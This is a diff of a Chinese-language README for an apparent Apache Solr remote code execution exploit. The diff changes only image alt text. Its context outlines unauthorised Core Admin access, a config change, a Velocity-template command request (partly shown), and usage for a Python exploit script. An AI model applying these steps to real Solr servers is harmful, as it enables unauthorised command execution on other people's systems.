@@ -4,7 +4,8 @@
 
 step1:
 通过Solr未授权访问，访问Core Admin，获取Path
-![image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031164421.png)
+
+![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031164421.png)
 
 step2:
 修改配置
@@ -26,7 +27,7 @@ Content-Length: 259
   }
 }
 ```
-![image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031165408.png)
+![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031165408.png)
 
 step3:
 执行命令
@@ -35,10 +36,10 @@ GET /solr/(第一步获取到的Path)/select?q=1&&wt=velocity&v.template=custom&
 Host: xxx:8983
 User-Agent: xxx
 ```
-![image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031165755.png)
+![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031165755.png)
 
 ### python exp
 
 使用方法：
 python solr_rce.py url "command"
-![image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031170416.png)
+![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031170416.png)
